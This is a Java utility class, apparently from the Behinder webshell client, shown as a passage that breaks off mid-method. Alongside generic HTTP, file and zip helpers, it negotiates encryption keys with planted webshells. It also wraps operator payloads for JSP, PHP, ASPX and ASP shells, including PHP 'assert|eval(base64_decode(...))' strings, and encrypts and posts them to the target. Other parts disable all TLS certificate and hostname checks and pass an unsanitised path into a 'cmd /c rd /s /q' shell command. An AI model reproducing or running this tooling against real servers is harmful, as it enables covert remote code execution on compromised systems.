

package net.rebeyond.behinder.utils;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.Desktop.Action;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UncheckedIOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collector;
import java.util.zip.GZIPInputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.stage.StageStyle;
import javafx.stage.Window;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.tools.FileObject;
import javax.tools.ForwardingJavaFileManager;
import javax.tools.JavaFileManager;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.JavaFileManager.Location;
import javax.tools.JavaFileObject.Kind;

import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.ui.controller.MainController;
import net.rebeyond.behinder.utils.jc.Run;
import org.json.JSONObject;
import org.objectweb.asm.Opcodes;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Utils {
    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
    private static Logger logger= LoggerFactory.getLogger(Utils.class);

    public Utils() {
    }

    public static boolean checkIP(String ipAddress) {
        String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        Pattern pattern = Pattern.compile(ip);
        Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }

    public static boolean compareVersion(String currentVersion,String latestVersion){
        float currentVer=Float.parseFloat(currentVersion.substring(1,4));
        float targetVer=Float.parseFloat(latestVersion.substring(1,4));
        logger.info("currentVersion:"+currentVer);
        logger.info("latestVersion:"+targetVer);
        if(currentVer<targetVer){
            return true;
        }else{
            return false;
        }
    }

    public static boolean checkPort(String portTxt) {
        String port = "([0-9]{1,5})";
        Pattern pattern = Pattern.compile(port);
        Matcher matcher = pattern.matcher(portTxt);
        return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }

    public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        URL url;
        HttpURLConnection urlConnection;
        InputStreamReader isr;
        Map<String, String> getHeaders = new HashMap<>();
        getHeaders.putAll(requestHeaders);
        getHeaders.remove("Content-Type");
        getHeaders.remove("Referer");
        Map<String, String> result = new HashMap<>();
        StringBuffer sb = new StringBuffer();
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + new Random().nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + new Random().nextInt(1000));
        }
        HttpURLConnection.setFollowRedirects(false);
        if (url.getProtocol().equals("https")) {
            if (MainController.currentProxy.get("proxy") != null) {
                urlConnection = (HttpsURLConnection) url.openConnection((Proxy) MainController.currentProxy.get("proxy"));
            } else {
                urlConnection = (HttpsURLConnection) url.openConnection();
            }
        } else if (MainController.currentProxy.get("proxy") != null) {
            urlConnection = (HttpURLConnection) url.openConnection((Proxy) MainController.currentProxy.get("proxy"));
        } else {
            urlConnection = (HttpURLConnection) url.openConnection();
        }
        for (String headerName : getHeaders.keySet()) {
            urlConnection.setRequestProperty(headerName, getHeaders.get(headerName));
        }
        if (urlConnection.getResponseCode() == 302 || urlConnection.getResponseCode() == 301) {
            String urlwithSession = urlConnection.getHeaderFields().get("Location").get(0).toString();
            if (!urlwithSession.startsWith("http")) {
                urlwithSession = (url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession).replaceAll(password + "=[0-9]*", "");
            }
            result.put("urlWithSession", urlwithSession);
        }
        boolean error = false;
        String errorMsg = "";
        if (urlConnection.getResponseCode() == 500) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            char[] buf = new char[Opcodes.ACC_INTERFACE];
            new ByteArrayOutputStream();
            for (int bytesRead = isr.read(); bytesRead > 0; bytesRead = isr.read(buf)) {
            }
            errorMsg = "密钥获取失败,密码错误?";
        } else if (urlConnection.getResponseCode() == 404) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(urlConnection.getInputStream());
        }
        BufferedReader br = new BufferedReader(isr);
        while (true) {
            String line = br.readLine();
            if (line == null) {
                break;
            }
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        }
        String rawKey_1 = sb.toString();
        if (!Pattern.compile("[a-fA-F0-9]{16}").matcher(rawKey_1).find()) {
            throw new Exception("页面存在，但是无法获取密钥!");
        }
        int start = 0;
        int end = 0;
        int cycleCount = 0;
        while (true) {
            Map<String, String> KeyAndCookie = getRawKey(getUrl, password, getHeaders);
            String rawKey_2 = KeyAndCookie.get("key");
            byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
            int i = 0;
            while (true) {
                if (i >= temp.length) {
                    break;
                } else if (temp[i] <= 0) {
                    i++;
                } else if (start == 0 || i <= start) {
                    start = i;
                }
            }
            int i2 = temp.length - 1;
            while (true) {
                if (i2 < 0) {
                    break;
                } else if (temp[i2] <= 0) {
                    i2--;
                } else if (i2 >= end) {
                    end = i2 + 1;
                }
            }
            if (end - start == 16) {
                result.put("cookie", KeyAndCookie.get("cookie"));
                result.put("beginIndex", start + "");
                result.put("endIndex", (temp.length - end) + "");
                result.put("key", new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end)));
                return result;
            } else if (cycleCount > 10) {
                throw new Exception("Can't figure out the key!");
            } else {
                cycleCount++;
            }
        }
    }

    public static String getKey(String password) throws Exception {
        return getMD5(password);
    }

    public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        Map<String, String> result = new HashMap();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }

        HttpURLConnection.setFollowRedirects(false);
        Object urlConnection;
        if (url.getProtocol().equals("https")) {
            urlConnection = (HttpsURLConnection)url.openConnection();
        } else {
            urlConnection = (HttpURLConnection)url.openConnection();
        }

        Iterator var9 = requestHeaders.keySet().iterator();

        while(var9.hasNext()) {
            String headerName = (String)var9.next();
            ((HttpURLConnection)urlConnection).setRequestProperty(headerName, (String)requestHeaders.get(headerName));
        }

        String cookieValues = "";
        Map<String, List<String>> headers = ((HttpURLConnection)urlConnection).getHeaderFields();
        Iterator var11 = headers.keySet().iterator();

        String errorMsg;
        while(var11.hasNext()) {
            errorMsg = (String)var11.next();
            if (errorMsg != null && errorMsg.equalsIgnoreCase("Set-Cookie")) {
                String cookieValue;
                for(Iterator var13 = ((List)headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
                    cookieValue = (String)var13.next();
                    cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                }

                cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
                break;
            }
        }

        result.put("cookie", cookieValues);
        boolean error = false;
        errorMsg = "";
        if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
        }

        br = new BufferedReader(isr);

        String line;
        while((line = br.readLine()) != null) {
            sb.append(line);
        }

        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            result.put("key", sb.toString());
            return result;
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        String line;
        if (conn.getResponseCode() == 200) {
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; result = result.append(line + "\n")) {
            }
        }

        return result.toString();
    }

    public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
        Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[])((byte[])resultObj.get("data"));
        if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }

        resultObj.put("data", resData);
        return resultObj;
    }

    public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        HttpURLConnection conn;
        Map<String, Object> result = new HashMap<>();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        URL url = new URL(urlPath);
        if (MainController.currentProxy.get("proxy") != null) {
            conn = (HttpURLConnection) url.openConnection((Proxy) MainController.currentProxy.get("proxy"));
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }
        conn.setConnectTimeout(15000);
        conn.setUseCaches(false);
        conn.setRequestMethod("POST");
        if (header != null) {
            Object[] keys = header.keySet().toArray();
            Arrays.sort(keys);
            int length = keys.length;
            for (int i = 0; i < length; i++) {
                Object key = keys[i];
                conn.setRequestProperty(key.toString(), header.get(key));
            }
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            String encoding = conn.getContentEncoding();
            if (encoding == null) {
                DataInputStream din = new DataInputStream(conn.getInputStream());
                byte[] buffer = new byte[Opcodes.ACC_ABSTRACT];
                while (true) {
                    int length2 = din.read(buffer);
                    if (length2 == -1) {
                        break;
                    }
                    bos.write(buffer, 0, length2);
                }
            } else if (encoding != null && encoding.equals("gzip")) {
                DataInputStream din2 = new DataInputStream(new GZIPInputStream(conn.getInputStream()));
                byte[] buffer2 = new byte[Opcodes.ACC_ABSTRACT];
                while (true) {
                    int length3 = din2.read(buffer2);
                    if (length3 == -1) {
                        break;
                    }
                    bos.write(buffer2, 0, length3);
                }
            } else {
                DataInputStream din3 = new DataInputStream(conn.getInputStream());
                byte[] buffer3 = new byte[Opcodes.ACC_ABSTRACT];
                while (true) {
                    int length4 = din3.read(buffer3);
                    if (length4 == -1) {
                        break;
                    }
                    bos.write(buffer3, 0, length4);
                }
            }
            result.put("data", bos.toByteArray());
            Map<String, String> responseHeader = new HashMap<>();
            for (String key2 : conn.getHeaderFields().keySet()) {
                responseHeader.put(key2, conn.getHeaderField(key2));
            }
            responseHeader.put("status", conn.getResponseCode() + "");
            result.put("header", responseHeader);
            return result;
        }
        DataInputStream din4 = new DataInputStream(conn.getErrorStream());
        byte[] buffer4 = new byte[Opcodes.ACC_ABSTRACT];
        while (true) {
            int length5 = din4.read(buffer4);
            if (length5 != -1) {
                bos.write(buffer4, 0, length5);
            } else {
                throw new Exception(new String(bos.toByteArray(), "GBK"));
            }
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for(reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        }else if(conn.getResponseCode()==404){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标资源不存在\n" + sb.toString());
        }else if(conn.getResponseCode()==500){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标服务器内部错误\n" + sb.toString());
        } else {
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常:\n" + sb.toString());
        }
    }

    public static String sendGetRequest(String urlPath, String cookie,int timeout) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();

        conn.setConnectTimeout(timeout);
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        }else if(conn.getResponseCode()==404){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标资源不存在\n" + sb.toString());
        }else if(conn.getResponseCode()==500){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标服务器内部错误\n" + sb.toString());
        } else {
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常:\n" + sb.toString());
        }
    }

    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();

        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        }else if(conn.getResponseCode()==404){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标资源不存在\n" + sb.toString());
        }else if(conn.getResponseCode()==500){
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }
            throw new Exception("请求返回异常: 目标服务器内部错误\n" + sb.toString());
        } else {
            for(reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常:\n" + sb.toString());
        }
    }

    public static boolean openWebpage(URI uri) {
        Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
        if (desktop != null && desktop.isSupported(Action.BROWSE)) {
            try {
                desktop.browse(uri);
                return true;
            } catch (Exception var3) {
                var3.printStackTrace();
            }
        }

        return false;
    }

    public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
        if (type.equals("jsp")) {
            return Base64.encode(Crypt.Encrypt(payload, key)).getBytes();
        }
        if (type.equals("php")) {
            return Base64.encode(Crypt.EncryptForPhp(("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes(), key, encryptType)).getBytes();
        }
        if (type.equals("aspx")) {
            Map<String, String> params = new LinkedHashMap<>();
            params.put("code", new String(payload));
            return getData(key, encryptType, "Eval", params, type);
        } else if (type.equals("asp")) {
            return Crypt.EncryptForAsp(payload, key);
        } else {
            return null;
        }
    }


    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map<String, String> params, String type) throws Exception {
        byte[] bincls;
        if (type.equals("jsp")) {
            bincls = Params.getParamedClassForPlugin(payloadPath, params);
            return bincls;
        } else {
            byte[] encrypedBincls;
            if (type.equals("php")) {
                bincls = Params.getParamedPhp(payloadPath, params);
                bincls = Base64.encode(bincls).getBytes();
                bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
                encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
                return Base64.encode(encrypedBincls).getBytes();
            } else if (type.equals("aspx")) {
                bincls = Params.getParamedAssembly(payloadPath, params);
                encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
                return encrypedBincls;
            } else if (type.equals("asp")) {
                bincls = Params.getParamedAsp(payloadPath, params);
                encrypedBincls = Crypt.EncryptForAsp(bincls, key);
                return encrypedBincls;
            } else {
                return null;
            }
        }
    }

    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, (byte[])null);
    }

    public static String map2Str(Map<String, String> paramsMap) {
        String result = "";

        String key;
        for(Iterator var2 = paramsMap.keySet().iterator(); var2.hasNext(); result = result + key + "^" + (String)paramsMap.get(key) + "\n") {
            key = (String)var2.next();
        }

        return result;
    }

    public static String getFileType(String fileName) {
        int extIndex = fileName.lastIndexOf(".");
        return extIndex >= 0 ? fileName.substring(extIndex + 1).toLowerCase() : "";
    }

    public static boolean deleteFileForce(String filePath){
        File file=new File(filePath);
        boolean result=false;
        String fileType="文件";
        if(file.exists()){
            if(!file.isFile()){
                fileType="目录";
            }

            String cmd="cmd /c rd /s /q "+filePath;
            try {
                Runtime.getRuntime().exec(cmd);
                Thread.sleep(500);
                if(file.exists()){
                    logger.debug("{}删除失败：{}",fileType,filePath);
                    return false;
                }else{
                    logger.debug("{}删除成功：{}",fileType,filePath);
                    return true;
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }else{
            logger.debug("文件或目录不存在，无法删除：{}",filePath);
            result=false;
            return result;
        }
        return result;
    }

    public static boolean deleteFile(String filePath){
        File file=new File(filePath);
        String fileType="文件";
        if(file.exists()){
            if(!file.isFile()){
                fileType="目录";
            }
            if(file.delete()){
                logger.debug("{}删除成功：{}",fileType,filePath);
                return true;
            }else{
                for (int i = 0; i < 10; i++) {
                    System.gc();
                    try {
                        Thread.sleep(100);
                        file.delete();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                logger.debug("{}删除失败：{}",fileType,filePath);
                return false;
            }
        }else{
            logger.debug("文件或目录不存在，无法删除：{}",filePath);
            return false;
        }
    }

    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
        byte[] bincls;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            encrypedBincls = Crypt.Encrypt(bincls, key);
            String basedEncryBincls = Base64.encode(encrypedBincls);
            return basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            bincls = Params.getParamedPhp(className, params);
            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        } else if (type.equals("asp")) {
            bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else {
            return null;
        }
    }

    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];

        int length;
        for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
        }

        fis.close();
        return fileContent;
    }

    public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
        List<byte[]> result = new ArrayList();
        byte[] buffer = new byte[size];
        ByteArrayInputStream bis = new ByteArrayInputStream(content);
        boolean var5 = false;

        int length;
        while((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }

        bis.close();
        return result;
    }

    public static void setClipboardString(String text) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable trans = new StringSelection(text);
        clipboard.setContents(trans, (ClipboardOwner)null);
    }

    public static byte[] getResourceData(String filePath) throws Exception {
        InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[102400];
        boolean var4 = false;

        int num;
        while((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }

        is.close();
        return bos.toByteArray();
    }

    public static byte[] ascii2unicode(String str, int type) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buf);
        byte[] var4 = str.getBytes();
        int var5 = var4.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            byte b = var4[var6];
            out.writeByte(b);
            out.writeByte(0);
        }

        if (type == 1) {
            out.writeChar(0);
        }

        return buf.toByteArray();
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }

    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }

    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        currentPath = (new File(currentPath)).getCanonicalPath();
        return currentPath;
    }

    public static String getSelfJarPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath().toString();
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 && currentPath.startsWith("/")) {
            currentPath = currentPath.substring(1);
        }

        return currentPath;
    }

    public static JSONObject parsePluginZip(String zipFilePath) throws Exception {
        logger.debug("加载插件:{}",zipFilePath);
        String pluginRootPath = getSelfPath() + "/Plugins";
        String pluginName = "";
        ZipFile zf = new ZipFile(zipFilePath);
        InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
        ZipInputStream zin = new ZipInputStream(in);

        ZipEntry ze;
        while((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals("plugin.config")) {
                BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));
                Properties pluginConfig = new Properties();
                pluginConfig.load(br);
                pluginName = pluginConfig.getProperty("name");
                br.close();
            }
        }

        zin.closeEntry();
        String pluginPath = pluginRootPath + "/" + pluginName;

        ZipUtil.unZipFiles(zipFilePath, pluginPath);
        FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
        Properties pluginConfig = new Properties();
        pluginConfig.load(fis);
        JSONObject pluginEntity = new JSONObject();
        pluginEntity.put("name", pluginName);
        pluginEntity.put("version", pluginConfig.getProperty("version", "v1.0"));
        pluginEntity.put("entryFile", pluginConfig.getProperty("entryFile", "index.html"));
        pluginEntity.put("icon", pluginConfig.getProperty("icon", "/Users/rebeyond/host.png"));
        pluginEntity.put("scriptType", pluginConfig.getProperty("scriptType"));
        pluginEntity.put("isGetShell", pluginConfig.getProperty("isGetShell"));
        pluginEntity.put("type", pluginConfig.getProperty("type"));
        pluginEntity.put("author", pluginConfig.getProperty("author"));
        pluginEntity.put("link", pluginConfig.getProperty("link"));
        pluginEntity.put("qrcode", pluginConfig.getProperty("qrcode"));
        pluginEntity.put("comment", pluginConfig.getProperty("comment"));

//        修复插件不能删除bug，未正确关闭文件流
        in.close();
        zin.close();
        fis.close();
        return pluginEntity;
    }

    public static <T> T json2Obj(JSONObject json, Class target) throws Exception {
        T t = (T) target.newInstance();
        for (Field f : target.getDeclaredFields()) {
            try {
                String filedName = f.getName();
                target.getMethod("set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1), String.class).invoke(t, json.get(filedName).toString());
            } catch (Exception e) {
            }
        }
        return t;
    }


    public static String getMD5(String input) throws NoSuchAlgorithmException {
        if (input != null && input.length() != 0) {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(input.getBytes());
            byte[] byteArray = md5.digest();
            StringBuilder sb = new StringBuilder();
            byte[] var4 = byteArray;
            int var5 = byteArray.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                byte b = var4[var6];
                sb.append(String.format("%02x", b));
            }

            return sb.toString().substring(0, 16);
        } else {
            return null;
        }
    }

    public static void main(String[] args) {
        String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";

        try {
            getClassFromSourceCode(sourceCode);
        } catch (Exception var3) {
            var3.printStackTrace();
        }

    }

    public static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init((KeyManager[])null, trustAllCerts, new SecureRandom());
            List<String> cipherSuites = new ArrayList();
            String[] var3 = sc.getSupportedSSLParameters().getCipherSuites();
            int var4 = var3.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                String cipher = var3[var5];
                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
                    cipherSuites.add(cipher);
                }
            }

            HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (NoSuchAlgorithmException var7) {
            var7.printStackTrace();
        } catch (KeyManagementException var8) {
            var8.printStackTrace();
        }

    }

    public static Map<String, String> jsonToMap(JSONObject obj) {
        Map<String, String> result = new HashMap();
        Iterator var2 = obj.keySet().iterator();

